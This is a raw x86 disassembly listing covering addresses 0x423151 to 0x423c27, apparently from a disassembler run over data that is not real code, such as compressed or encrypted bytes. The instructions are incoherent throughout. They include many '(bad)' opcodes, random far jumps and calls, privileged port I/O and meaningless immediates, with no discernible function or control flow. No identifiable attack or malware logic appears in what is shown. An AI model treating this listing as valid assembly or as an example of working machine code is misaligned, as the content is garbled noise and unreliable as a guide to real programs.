  423151:	inc    eax
  423152:	add    eax,0x5813d8fd
  423157:	pusha  
  423158:	inc    eax
  423159:	inc    eax
  42315a:	inc    ebx
  42315b:	mov    dl,0xd9
  42315d:	(bad)
  423160:	xchg   edx,eax
  423161:	es sub eax,0x972be971
  423167:	shr    BYTE PTR [ecx-0x5dd94f87],cl
  42316d:	or     DWORD PTR [edx+0x123a5f22],esp
  423173:	jbe    0x423186
  423175:	mov    ds:0x33a7098b,al
  42317a:	add    DWORD PTR [eax+0x52],0xd8325c9a
  423181:	mov    al,0x8f
  423183:	adc    al,0x9a
  423185:	sub    BYTE PTR [esi],bh
  423187:	cmp    DWORD PTR [eax],eax
  423189:	lahf   
  42318a:	or     eax,0xf91dfdf2
  42318f:	jo     0x42313e
  423191:	mov    ebx,0x915f7729
  423196:	jno    0x423192
  423198:	jp     0x42316b
  42319a:	dec    ebx
  42319b:	lods   eax,DWORD PTR ds:[esi]
  42319c:	out    0xaf,al
  42319e:	ror    BYTE PTR [eax],0xd3
  4231a1:	push   ds
  4231a2:	and    DWORD PTR [ebx+0x222d1583],ebp
  4231a8:	jmp    0xa887:0x94694c59
  4231af:	mov    ebp,0x8c1fbb22
  4231b4:	cmp    DWORD PTR [edx+0x267a4fab],esi
  4231ba:	mov    BYTE PTR ds:0xc12b6f40,ch
  4231c0:	cmc    
  4231c1:	jp     0x4231c3
	...
  423233:	add    BYTE PTR [edi-0x10085213],cl
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0xe26628b0
  423243:	sahf   
  423244:	pushf  
  423245:	ja     0x423248
  423247:	add    dh,dh
  423249:	add    BYTE PTR [eax],al
  42324b:	add    BYTE PTR [esi*1-0x1a37fdcc],bl
  423252:	ror    DWORD PTR [esi+0x6143194],1
  423258:	xchg   edx,eax
  423259:	mov    cl,0x4d
  42325b:	cmp    al,0xa2
  42325d:	hlt    
  42325e:	ja     0x4232d2
  423260:	xor    BYTE PTR [edi+ebx*1],dl
  423263:	pop    es
  423264:	int    0x1a
  423266:	cwde   
  423267:	test   BYTE PTR [esi+0x19],al
  42326a:	inc    eax
  42326b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42326c:	cmp    dh,0x3c
  42326f:	mov    ds,eax
  423271:	clc    
  423272:	mov    dl,0xe
  423274:	xor    edx,esi
  423276:	add    al,BYTE PTR [edx-0x6ca21cf7]
  42327c:	stos   DWORD PTR es:[edi],eax
  42327d:	rol    eax,0x3e
  423280:	and    cl,ch
  423282:	pop    ebx
  423283:	outs   dx,DWORD PTR ds:[esi]
  423284:	cmp    DWORD PTR [edi+eiz*8-0x43],edx
  423288:	add    BYTE PTR [ebp+edi*2-0x5e6c0f2],al
  42328f:	push   es
  423290:	jb     0x423303
  423292:	and    al,0xc9
  423294:	dec    esi
  423295:	pop    eax
  423296:	lods   al,BYTE PTR ds:[esi]
  423297:	and    eax,0xeba20c3a
  42329c:	stos   DWORD PTR es:[edi],eax
  42329d:	ss mov bl,0x57
  4232a0:	cwde   
  4232a1:	test   DWORD PTR [edi-0x1082ec70],0xa65a1573
  4232ab:	fisub  DWORD PTR [edx]
  4232ad:	jl     0x423281
  4232af:	mov    ds:0xc3bf6064,al
  4232b4:	int    0xf6
  4232b6:	dec    ebx
  4232b7:	test   DWORD PTR [ecx-0x39],ecx
  4232ba:	(bad)  
  4232bb:	(bad)  
  4232bc:	pop    eax
  4232bd:	je     0x423244
  4232bf:	rol    BYTE PTR [eax+0x4e],0xff
  4232c3:	cmp    edi,DWORD PTR [edi]
  4232c5:	test   al,0x1c
  4232c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232c8:	neg    dh
  4232ca:	or     esi,DWORD PTR [ebp+0x7]
  4232cd:	jb     0x423319
  4232cf:	ins    DWORD PTR es:[edi],dx
  4232d0:	jl     0x423252
  4232d2:	bound  ecx,QWORD PTR [ecx+ebx*1]
  4232d5:	std    
  4232d6:	test   BYTE PTR [eax],bl
  4232d8:	js     0x42330c
  4232da:	dec    ecx
  4232db:	inc    ecx
  4232dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232dd:	mov    al,ds:0xee45df5d
  4232e2:	pop    es
  4232e3:	dec    ebx
  4232e4:	inc    esi
  4232e5:	dec    eax
  4232e6:	xchg   edi,eax
  4232e7:	push   ecx
  4232e8:	ins    DWORD PTR es:[edi],dx
  4232e9:	dec    eax
  4232ea:	loope  0x423274
  4232ec:	ja     0x423368
  4232ee:	and    eax,0x76ecf4ee
  4232f3:	add    ch,BYTE PTR [ebp-0x5b41d8f9]
  4232f9:	arpl   WORD PTR ds:0x3f7bf313,cx
  4232ff:	(bad)  
  423301:	es xchg edi,eax
  423303:	mov    ebx,0x6b773880
  423308:	popf   
  423309:	push   0xffffffa9
  42330b:	test   al,0x79
  42330d:	inc    ebx
  42330e:	mov    ds:0x8bd23deb,eax
  423313:	dec    edx
  423314:	mov    ah,ch
  423316:	inc    ecx
  423317:	pop    ecx
  423318:	inc    ebp
  423319:	ret    
  42331a:	sub    DWORD PTR [ebp+ebp*1-0x13],edi
  42331e:	stos   BYTE PTR es:[edi],al
  42331f:	xchg   bh,cl
  423321:	jmp    0x1245e2eb
  423326:	jae    0x42335c
  423328:	data16 jle 0x4232b6
  42332b:	fwait
  42332c:	scas   al,BYTE PTR es:[edi]
  42332d:	cmp    DWORD PTR [ecx],ebp
  42332f:	aad    0xd2
  423331:	jno    0x423336
  423333:	fcomp  st(7)
  423335:	jbe    0x423361
  423337:	cmp    eax,0xb175c7d9
  42333c:	pusha  
  42333d:	int    0x48
  42333f:	dec    ebp
  423340:	dec    edi
  423341:	dec    edx
	...
  4233b2:	add    BYTE PTR [eax],al
  4233b4:	push   edx
  4233b5:	sub    BYTE PTR [esi],0x69
  4233b8:	(bad)  
  4233b9:	in     eax,dx
  4233ba:	push   edi
  4233bb:	mov    ebx,0x8e4aa104
  4233c0:	add    al,0x6e
  4233c2:	fiadd  WORD PTR [edi]
  4233c4:	xchg   edx,eax
  4233c5:	js     0x4233c8
  4233c7:	add    dh,dh
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    BYTE PTR [edx],ch
  4233cd:	inc    edx
  4233ce:	idiv   DWORD PTR [ebp+ebx*4-0x478a750a]
  4233d5:	pop    ebx
  4233d6:	fbld   TBYTE PTR [edi-0x3b]
  4233d9:	cmc    
  4233da:	mov    ds,edi
  4233dc:	mov    ebx,0xc8f63473
  4233e1:	sub    ebx,DWORD PTR [eax+0x47]
  4233e4:	and    edx,DWORD PTR [eax-0x6d3c4830]
  4233ea:	jge    0x423462
  4233ec:	rep stos BYTE PTR es:[edi],al
  4233ee:	test   dh,dh
  4233f0:	ret    0x91a3
  4233f3:	or     al,0x23
  4233f5:	mov    ch,dh
  4233f7:	mov    bl,0xa8
  4233f9:	loop   0x423381
  4233fb:	addr16 jge 0x423383
  4233fe:	dec    esi
  4233ff:	jne    0x4233b9
  423401:	(bad)  
  423402:	cld    
  423403:	test   eax,0x6be96da9
  423408:	sub    BYTE PTR [ebp+0x76],al
  42340b:	sahf   
  42340c:	jne    0x4233e2
  42340e:	mov    ch,0xe5
  423410:	add    al,0x2d
  423412:	adc    eax,0x85efb417
  423417:	std    
  423418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423419:	xchg   BYTE PTR [esi+0x7d],ah
  42341c:	or     BYTE PTR [esi-0x2c],ch
  42341f:	addr16 push esi
  423421:	push   edi
  423422:	or     BYTE PTR [ebx+0x2e],ch
  423425:	test   al,0xee
  423427:	push   eax
  423428:	imul   eax,DWORD PTR [ebx+edx*4+0x44fb1064],0xffffffb8
  423430:	push   ebx
  423431:	out    0x9a,eax
  423433:	adc    DWORD PTR [ecx+0x2dfc17ce],ebp
  423439:	lods   al,BYTE PTR ds:[esi]
  42343a:	(bad)  
  42343b:	std    
  42343c:	in     al,0x8b
  42343e:	nop
  42343f:	pop    es
  423440:	mov    edx,0x2f411bf6
  423445:	mov    ebp,0x2bb004c8
  42344a:	sub    esp,DWORD PTR [edi+0x7c]
  42344d:	mov    ecx,0x376629f0
  423452:	pop    esp
  423453:	push   ebp
  423454:	std    
  423455:	cmp    al,0x3b
  423457:	mov    eax,ds:0xc26723ab
  42345c:	lahf   
  42345d:	adc    BYTE PTR [eax-0x1e797add],ah
  423463:	dec    ecx
  423464:	neg    DWORD PTR [ecx+0x24f64305]
  42346a:	sbb    edi,DWORD PTR [edx+0x2e]
  42346d:	mov    edi,0x694fad8e
  423472:	clc    
  423473:	dec    edx
  423474:	add    eax,DWORD PTR [ebp+esi*4+0x31d36f5d]
  42347b:	add    al,0x3f
  42347d:	mov    ebp,DWORD PTR [ecx+0x3]
  423480:	test   DWORD PTR [ebx+0x267ffa1a],esp
  423486:	cmp    DWORD PTR [ebx+0x5f488529],eax
  42348c:	inc    edi
  42348d:	add    dl,bl
  42348f:	mov    dl,0xfd
  423491:	add    eax,0x289acddd
  423496:	rcr    DWORD PTR [esi+0x56bb82d9],1
  42349c:	mov    ebp,DWORD PTR [eax+0x11]
  42349f:	mov    bl,dl
  4234a1:	call   0x68dd3722
  4234a6:	cli    
  4234a7:	mov    ebp,0x26aa699b
  4234ac:	test   eax,0x5df04c47
  4234b1:	sub    BYTE PTR [esi],dl
  4234b3:	dec    esi
  4234b4:	lahf   
  4234b5:	arpl   WORD PTR [edx+0x607d3a49],bp
  4234bb:	and    bl,BYTE PTR [ecx]
  4234bd:	lods   al,BYTE PTR ds:[esi]
  4234be:	pop    edi
  4234bf:	inc    esi
  4234c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234c1:	add    BYTE PTR ss:[eax],al
	...
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x11
  423541:	inc    eax
  423542:	push   cs
  423543:	stos   BYTE PTR es:[edi],al
  423544:	mov    BYTE PTR [ecx+0x1],bh
  423547:	add    dh,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [eax+0x68],ah
  42354e:	mov    bl,0xa7
  423550:	out    dx,al
  423551:	xchg   edi,eax
  423552:	xchg   esp,eax
  423553:	scas   eax,DWORD PTR es:[edi]
  423554:	cmp    ecx,DWORD PTR [eax]
  423556:	pop    edx
  423557:	cmp    al,0xe1
  423559:	mov    cl,BYTE PTR [eax+0x55]
  42355c:	call   0xf0c04162
  423561:	daa    
  423562:	nop
  423563:	or     esi,ebp
  423565:	imul   BYTE PTR [edx]
  423567:	pop    edx
  423568:	xor    eax,edx
  42356a:	cli    
  42356b:	mov    BYTE PTR [ecx-0x1e],cl
  42356e:	mov    ecx,0x7d5539cc
  423573:	and    DWORD PTR [esp+edx*2+0x37],edi
  423577:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  423579:	out    dx,eax
  42357a:	xor    DWORD PTR [esi-0x7d],0x8d7597c8
  423581:	popf   
  423582:	jae    0x423549
  423584:	push   esi
  423585:	or     esi,DWORD PTR [eax]
  423587:	inc    ebx
  423588:	add    al,0x8a
  42358a:	adc    BYTE PTR [ebp+0x4ed1092e],al
  423590:	test   DWORD PTR [edx-0x1c],ebx
  423593:	(bad)  
  423594:	push   edi
  423595:	adc    DWORD PTR [ebx+0xf],0xffffffa4
  423599:	cmp    eax,0xa29a7bd6
  42359e:	or     al,0x88
  4235a0:	imul   ebp,DWORD PTR [ecx-0x7f7d89c9],0xf912660c
  4235aa:	mov    dh,0x32
  4235ac:	mov    ebx,0x58e38e56
  4235b1:	mov    bl,0xcd
  4235b3:	push   edx
  4235b4:	ja     0x423621
  4235b6:	mov    cl,0x3d
  4235b8:	pusha  
  4235b9:	outs   dx,BYTE PTR ds:[esi]
  4235ba:	pushf  
  4235bb:	outs   dx,DWORD PTR ds:[esi]
  4235bc:	xor    esp,DWORD PTR [edx]
  4235be:	inc    edi
  4235bf:	in     al,0x82
  4235c1:	stos   BYTE PTR es:[edi],al
  4235c2:	mov    ds:0x7abf22b3,eax
  4235c7:	sub    eax,0x9f0a604f
  4235cc:	pop    ss
  4235cd:	aam    0x7a
  4235cf:	inc    ebp
  4235d0:	loope  0x4235fb
  4235d2:	maxps  xmm1,XMMWORD PTR [ebx]
  4235d5:	mov    esp,fs
  4235d7:	test   al,0xed
  4235d9:	sub    al,0x8a
  4235db:	repz aas 
  4235dd:	das    
  4235de:	lds    ebp,FWORD PTR [esi-0x45]
  4235e1:	enter  0x2a61,0x4
  4235e5:	data16 jp 0x42362d
  4235e8:	inc    esp
  4235ea:	xor    eax,0x6f2b085a
  4235ef:	pop    ss
  4235f0:	test   DWORD PTR [edi+0x5],ecx
  4235f3:	addr16 stc 
  4235f5:	test   eax,0x48568beb
  4235fa:	inc    ecx
  4235fb:	test   al,0x83
  4235fd:	addr16 js 0x423604
  423600:	mov    ds:0x98a691f3,al
  423605:	adc    ch,0xdb
  423608:	aam    0xe5
  42360a:	icebp  
  42360b:	push   0x8f8a6c83
  423610:	pop    esi
  423611:	bound  ebx,QWORD PTR [edi]
  423613:	mov    ds:0x924499c,al
  423618:	aaa    
  423619:	sbb    DWORD PTR [edx],edx
  42361b:	add    eax,DWORD PTR [ecx]
  42361d:	sub    DWORD PTR [eax+0x321fda89],edx
  423623:	data16 mov bl,0x33
  423626:	inc    esi
  423627:	jmp    0xa01ce589
  42362c:	mov    BYTE PTR [ebp+0x5b],al
  42362f:	ja     0x423635
  423631:	cli    
  423632:	ins    BYTE PTR es:[edi],dx
  423633:	mov    ebp,0x365a1a02
  423638:	mov    eax,ds
  42363a:	pop    esi
  42363b:	sub    DWORD PTR [ecx+0x66ba8604],esi
  423641:	xchg   esi,eax
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm3,QWORD PTR [eax+edi*4+0x7a7eda06]
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	test   BYTE PTR [eax],0x0
  4236cb:	add    dl,al
  4236cd:	mov    cl,0x6
  4236cf:	stos   DWORD PTR es:[edi],eax
  4236d0:	add    ch,BYTE PTR [edx+0x17]
  4236d3:	std    
  4236d4:	or     ebx,DWORD PTR [eax+edi*8+0x6ee0eb91]
  4236db:	popf   
  4236dc:	out    dx,eax
  4236dd:	add    bh,BYTE PTR ds:0x653aa07d
  4236e3:	je     0x423692
  4236e5:	fnstsw WORD PTR [edi]
  4236e7:	aad    0xdd
  4236e9:	ins    BYTE PTR es:[edi],dx
  4236ea:	outs   dx,BYTE PTR ds:[esi]
  4236eb:	jae    0x42371c
  4236ed:	outs   dx,BYTE PTR ds:[esi]
  4236ee:	mov    bh,0xd0
  4236f0:	xlat   BYTE PTR ds:[ebx]
  4236f1:	mov    DWORD PTR [esi],ecx
  4236f3:	shr    DWORD PTR [ebp+0x5d],1
  4236f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236f7:	xchg   edx,eax
  4236f8:	pop    es
  4236f9:	ins    BYTE PTR es:[edi],dx
  4236fa:	inc    esp
  4236fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236fc:	push   cs
  4236fd:	add    dh,bh
  4236ff:	dec    ebp
  423700:	sbb    al,0xf6
  423702:	ja     0x423713
  423704:	jns    0x42371e
  423706:	fnstcw WORD PTR [ebx+0x26469eba]
  42370c:	leave  
  42370d:	or     eax,DWORD PTR [ebp+0x1f0193dd]
  423713:	stos   BYTE PTR es:[edi],al
  423714:	xchg   ebp,eax
  423715:	cmp    BYTE PTR [ecx],ch
  423717:	xor    ebp,ebx
  423719:	add    ebx,esp
  42371b:	sub    al,0xf9
  42371d:	or     DWORD PTR [edx+0x6cb1921a],0xffffffe0
  423724:	mov    al,0xc2
  423726:	pop    esi
  423727:	outs   dx,DWORD PTR ds:[esi]
  423728:	cmp    dl,BYTE PTR [edx+0x13]
  42372b:	sar    BYTE PTR [ecx],cl
  42372d:	mov    ecx,0xf8c0fa10
  423732:	loopne 0x42376b
  423734:	mov    ah,0xd7
  423736:	test   ch,al
  423738:	call   0x9ae1246f
  42373d:	mov    ebx,0x6dff4776
  423742:	jp     0x423774
  423744:	jecxz  0x4237ae
  423746:	lock dec eax
  423748:	adc    BYTE PTR [edx-0x30dba975],ah
  42374e:	mov    eax,ds:0xf8f43812
  423753:	mov    bl,BYTE PTR [eax-0x31]
  423756:	fidiv  WORD PTR [ebx+0x61]
  423759:	inc    esp
  42375a:	fs add al,0x6
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	sub    bh,BYTE PTR [esi]
  423761:	out    dx,al
  423762:	std    
  423763:	pop    ds
  423764:	imul   edi,DWORD PTR [ecx],0xffffffeb
  423767:	add    eax,0x482a0881
  42376c:	fidivr DWORD PTR [eax]
  42376e:	sbb    ebx,DWORD PTR [edx+0x2c]
  423771:	inc    ebx
  423772:	xchg   ebx,eax
  423773:	push   ecx
  423774:	jno    0x423762
  423776:	mov    al,0x51
  423778:	inc    edx
  423779:	pop    es
  42377a:	nop
  42377b:	cli    
  42377c:	ss inc esp
  42377e:	rol    BYTE PTR [ecx+0xbb73d91],0x7a
  423785:	xchg   esp,eax
  423786:	lahf   
  423787:	inc    ecx
  423788:	loope  0x4237c7
  42378a:	push   0xb5f01e73
  42378f:	fs popf 
  423791:	inc    edi
  423792:	ja     0x4237ac
  423794:	outs   dx,BYTE PTR ds:[esi]
  423795:	mov    bh,0xea
  423797:	(bad)  
  423798:	push   cs
  423799:	mov    BYTE PTR [ebx],bh
  42379b:	in     al,dx
  42379c:	dec    ebx
  42379d:	int3   
  42379e:	inc    ebp
  42379f:	jno    0x423804
  4237a1:	inc    edx
  4237a2:	jne    0x4237d5
  4237a4:	or     eax,0x52b5dd3
  4237a9:	push   ebp
  4237aa:	cmp    al,0x83
  4237ac:	por    mm4,QWORD PTR [eax+eax*4-0x4f]
  4237b1:	clc    
  4237b2:	ret    0xe7e0
  4237b5:	ja     0x4237c5
  4237b7:	inc    esi
  4237b8:	das    
  4237b9:	xchg   ebx,eax
  4237ba:	lods   eax,DWORD PTR ds:[esi]
  4237bb:	sub    al,0x44
  4237bd:	popa   
  4237be:	cld    
  4237bf:	enter  0x7233,0x0
	...
  423833:	add    ch,cl
  423835:	cmp    DWORD PTR [eax-0x10680369],edi
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	xor    eax,0x742b1c29
  423845:	jnp    0x423848
  423847:	add    dh,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    BYTE PTR [ebx],bl
  42384d:	icebp  
  42384e:	mov    esi,0x1e2535ca
  423853:	shl    BYTE PTR [ecx-0x59ae4da1],0x73
  42385a:	out    0xbc,al
  42385c:	push   0x55
  42385e:	test   eax,0xb6bb27c3
  423863:	ficom  WORD PTR [esi-0x517c527e]
  423869:	mov    bh,0xda
  42386b:	popf   
  42386c:	inc    edx
  42386d:	inc    ecx
  42386e:	ror    BYTE PTR [eax-0x78],0x23
  423872:	push   edx
  423873:	cld    
  423874:	pop    ds
  423875:	int3   
  423876:	add    ah,cl
  423878:	scas   eax,DWORD PTR es:[edi]
  423879:	cmp    eax,0x5702b436
  42387e:	or     BYTE PTR [ebp*4-0x1e7e8b5a],ch
  423885:	sbb    ecx,DWORD PTR [eax-0xac0f1b0]
  42388b:	jmp    0xab94:0x7ce8c9a7
  423892:	sub    DWORD PTR [eax+0x665cc54e],eax
  423898:	push   ebx
  423899:	add    eax,0xe5133228
  42389e:	test   eax,0xcb02b40f
  4238a3:	mov    ds:0xbcc9f8b5,al
  4238a8:	jns    0x4238d4
  4238aa:	ret    
  4238ab:	sub    eax,0xa5351b02
  4238b0:	leave  
  4238b1:	(bad)  
  4238b2:	in     al,dx
  4238b3:	pop    es
  4238b4:	push   edi
  4238b5:	mov    edi,0xd463de11
  4238ba:	pushf  
  4238bb:	(bad)  
  4238bd:	aas    
  4238be:	in     eax,0x4a
  4238c0:	mov    al,ds:0x606af7fa
  4238c5:	xchg   DWORD PTR [ebx+0x19],esi
  4238c8:	jmp    0x3bd0:0xba1f060e
  4238cf:	loop   0x42390b
  4238d1:	jmp    0x6efc:0xeb6ffb46
  4238d8:	push   eax
  4238d9:	mov    eax,ds:0x60638f7d
  4238de:	into   
  4238df:	and    eax,0x2e161fb4
  4238e4:	jne    0x423919
  4238e6:	retf   
  4238e7:	push   ss
  4238e8:	int    0x80
  4238ea:	mov    eax,0x1eaacbe9
  4238ef:	mov    cl,0xe4
  4238f1:	ficomp DWORD PTR [esi+0x29]
  4238f4:	push   ecx
  4238f5:	cmp    dl,BYTE PTR [ebx+0x49726efe]
  4238fb:	call   0xdc2a:0x9326f7d3
  423902:	dec    ecx
  423903:	cwde   
  423904:	inc    edx
  423905:	rcl    ecx,1
  423907:	or     bl,BYTE PTR ds:0x8aa9b36d
  42390d:	mov    ds:0xcda1a1a4,eax
  423912:	xchg   DWORD PTR [edi],edx
  423914:	(bad)  
  423915:	iret   
  423916:	ss lahf 
  423918:	pop    es
  423919:	iret   
  42391a:	xchg   ecx,eax
  42391b:	cmp    eax,0x70760dda
  423920:	je     0x423941
  423922:	xor    ebx,ebp
  423924:	mov    BYTE PTR [ecx+0x37],dl
  423927:	adc    ecx,DWORD PTR [edx]
  423929:	ret    0x58af
  42392c:	dec    esi
  42392d:	mov    ah,0xfd
  42392f:	aad    0x97
  423931:	pushf  
  423932:	mov    al,0xf5
  423934:	jl     0x4238c0
  423936:	in     eax,dx
  423937:	sub    bl,cl
  423939:	test   al,0x72
  42393b:	into   
  42393c:	mov    al,0xc0
  42393e:	sahf   
  42393f:	cld    
  423940:	jg     0x423978
	...
  4239b2:	add    BYTE PTR [eax],al
  4239b4:	xchg   esi,eax
  4239b5:	push   0x18
  4239b7:	mov    ah,bh
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [eax],cs
  4239c1:	pusha  
  4239c2:	dec    esp
  4239c3:	push   0x17c6a
  4239c8:	test   BYTE PTR [eax],0x0
  4239cb:	add    BYTE PTR [edx],dh
  4239cd:	adc    al,0x46
  4239cf:	dec    esp
  4239d0:	sbb    bh,BYTE PTR [eax-0x3ea0c0c7]
  4239d6:	cwde   
  4239d7:	jge    0x423a24
  4239d9:	mov    WORD PTR [ebx],gs
  4239db:	hlt    
  4239dc:	push   esp
  4239dd:	sub    bh,dh
  4239df:	sbb    eax,0xd7133c27
  4239e4:	outs   dx,DWORD PTR ds:[esi]
  4239e5:	dec    ebp
  4239e6:	push   cs
  4239e7:	mov    cl,0x33
  4239e9:	mov    eax,ds:0x6a344fd8
  4239ee:	jb     0x423983
  4239f0:	mov    ebp,0x35eb97db
  4239f5:	sbb    DWORD PTR [esp+eiz*2+0x1a],ebx
  4239f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239fa:	imul   eax,DWORD PTR [edi+0x66],0x791a8917
  423a01:	dec    edi
  423a02:	popa   
  423a03:	mul    BYTE PTR ds:0xd441e658
  423a09:	adc    ch,BYTE PTR [eax]
  423a0b:	dec    esi
  423a0c:	xor    DWORD PTR [ecx-0x41],esp
  423a0f:	fld    QWORD PTR [eax+0x6f]
  423a12:	or     dh,BYTE PTR [ecx+0x66040acc]
  423a18:	leave  
  423a19:	dec    ebx
  423a1a:	pop    esp
  423a1b:	xor    DWORD PTR [ebx-0x21],ecx
  423a1e:	dec    ecx
  423a1f:	jmp    0x423a87
  423a21:	xchg   ebp,eax
  423a22:	cmp    bl,BYTE PTR [edx-0x7049df8e]
  423a28:	cwde   
  423a29:	lds    edi,FWORD PTR [ecx]
  423a2b:	cmp    BYTE PTR [esi-0x3b],al
  423a2e:	loopne 0x423a33
  423a30:	dec    edx
  423a31:	sbb    eax,0x63229714
  423a36:	jmp    0xbeeadb33
  423a3b:	push   cs
  423a3c:	mov    ch,0x74
  423a3e:	adc    cl,bh
  423a40:	mov    DWORD PTR [ebx],edi
  423a42:	mov    esp,0xcf087df7
  423a47:	or     bl,BYTE PTR [edx+0x1be342db]
  423a4d:	fbstp  TBYTE PTR [ebx-0x34]
  423a50:	inc    ecx
  423a51:	pop    edi
  423a52:	ins    BYTE PTR es:[edi],dx
  423a53:	dec    edx
  423a54:	(bad)  
  423a55:	ja     0x423a52
  423a57:	dec    eax
  423a58:	test   eax,0xc4a0c36a
  423a5d:	push   ebp
  423a5e:	and    DWORD PTR [ebp+0x62],ebp
  423a61:	jmp    0x423a0b
  423a63:	scas   al,BYTE PTR es:[edi]
  423a64:	push   ds
  423a65:	inc    edx
  423a66:	mov    esp,0xf80a97cf
  423a6b:	mov    dh,0x3e
  423a6d:	rcl    BYTE PTR [ecx+0x2a5b7715],1
  423a73:	fild   WORD PTR fs:[ebp+0x2fb09aff]
  423a7a:	bound  ebx,QWORD PTR [ecx+0x6a3f9652]
  423a80:	test   eax,0x8c11d715
  423a85:	inc    esi
  423a86:	je     0x423afd
  423a88:	pusha  
  423a89:	out    0x81,al
  423a8b:	(bad)  
  423a8c:	std    
  423a8d:	mov    ebx,0xaf7b748f
  423a92:	arpl   WORD PTR [esp+eax*2],cx
  423a95:	jns    0x423ab9
  423a97:	pusha  
  423a98:	test   BYTE PTR [eax+0x15],dh
  423a9b:	push   es
  423a9c:	fwait
  423a9d:	sub    al,0xfb
  423a9f:	stos   DWORD PTR es:[di],eax
  423aa1:	push   es
  423aa2:	aam    0x1e
  423aa4:	outs   dx,BYTE PTR ds:[esi]
  423aa5:	add    esi,DWORD PTR [ebx-0x54e1c6ea]
  423aab:	and    dh,bh
  423aad:	adc    ebp,ebx
  423aaf:	sbb    ch,dl
  423ab1:	jp     0x423ae2
  423ab3:	rol    BYTE PTR [ebx+eiz*2-0x269ca946],0xc5
  423abb:	push   eax
  423abc:	xchg   DWORD PTR [eax+0xd],edx
  423abf:	jnp    0x423a67
  423ac1:	push   ebp
	...
  423b32:	add    BYTE PTR [eax],al
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x5a
  423b41:	jmp    DWORD PTR [esi]
  423b43:	jno    0x423ba5
  423b45:	jge    0x423b48
  423b47:	add    dh,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [esp+edx*2-0x2e],dl
  423b4f:	add    DWORD PTR ss:[edx],ebx
  423b52:	jno    0x423b4a
  423b54:	fld    QWORD PTR [ebp-0x2d16454b]
  423b5a:	adc    al,0xd2
  423b5c:	inc    eax
  423b5d:	mov    eax,ds:0x1fc4df88
  423b62:	cs xchg esp,eax
  423b64:	mov    eax,ds:0xd29d013d
  423b69:	sahf   
  423b6a:	push   ss
  423b6b:	nop
  423b6c:	sti    
  423b6d:	jecxz  0x423b5e
  423b6f:	pop    edi
  423b70:	dec    ecx
  423b71:	cld    
  423b72:	mov    al,0xa9
  423b74:	lahf   
  423b75:	push   ebp
  423b76:	add    DWORD PTR [ecx+0x7e],esi
  423b79:	int    0x4e
  423b7b:	inc    ebp
  423b7c:	ins    BYTE PTR es:[edi],dx
  423b7d:	sahf   
  423b7e:	scas   eax,DWORD PTR es:[edi]
  423b7f:	into   
  423b80:	push   eax
  423b81:	xor    DWORD PTR [esi+0x4b98f1b9],0xffffffb4
  423b88:	xor    DWORD PTR [ebx+0x1153b3c1],0x7eb177cc
  423b92:	jnp    0x423b3d
  423b94:	(bad)  [ecx]
  423b96:	and    al,0xae
  423b98:	test   BYTE PTR [eax+0x3bfa911],ah
  423b9e:	push   esi
  423b9f:	imul   eax,DWORD PTR [eax+0x2fa87e01],0x1c205c58
  423ba9:	int3   
  423baa:	cdq    
  423bab:	or     DWORD PTR [ebp-0x1f],ebx
  423bae:	adc    esi,DWORD PTR [edi-0x7]
  423bb1:	shr    BYTE PTR [ecx-0xa],cl
  423bb4:	adc    eax,0x685dc464
  423bb9:	jg     0x423b60
  423bbb:	or     DWORD PTR [edx],eax
  423bbd:	mov    al,ds:0x91e132d8
  423bc2:	adc    eax,0x3c960e51
  423bc7:	and    BYTE PTR [eax],bh
  423bc9:	fisubr WORD PTR [ebx+0x5951cab1]
  423bcf:	inc    BYTE PTR [eax-0x37]
  423bd2:	rcr    BYTE PTR [ecx+0x75],0x6c
  423bd6:	into   
  423bd7:	ret    0xfcc2
  423bda:	cmp    edi,DWORD PTR [ebp+0x39856dc]
  423be0:	mov    al,ds:0x6c60165d
  423be5:	and    al,0x8c
  423be7:	es inc ebp
  423be9:	mov    ch,0x1f
  423beb:	aad    0x9b
  423bed:	add    BYTE PTR [edx+0xfc2b855],dl
  423bf3:	repnz adc WORD PTR [ebx-0x4c],dx
  423bf8:	pop    ebp
  423bf9:	jbe    0x423bb8
  423bfb:	mov    esp,0x5b72bdef
  423c00:	aad    0x5c
  423c02:	dec    edx
  423c03:	jo     0x423b8f
  423c05:	xchg   ebx,eax
  423c06:	xlat   BYTE PTR ds:[ebx]
  423c07:	popf   
  423c08:	add    al,0xb2
  423c0a:	mov    eax,0x2ae7aecb
  423c0f:	xor    bh,BYTE PTR [edx-0x651a46bc]
  423c15:	(bad)  
  423c17:	adc    esi,edi
  423c19:	mov    dh,dh
  423c1b:	xchg   edx,eax
  423c1c:	push   eax
  423c1d:	jmp    0xbeafdf2e
  423c22:	dec    esp
  423c23:	into   
  423c24:	and    eax,DWORD PTR [ecx+0x52]
  423c27:	mov    BYTE PTR [ebx-0x72],0xd0
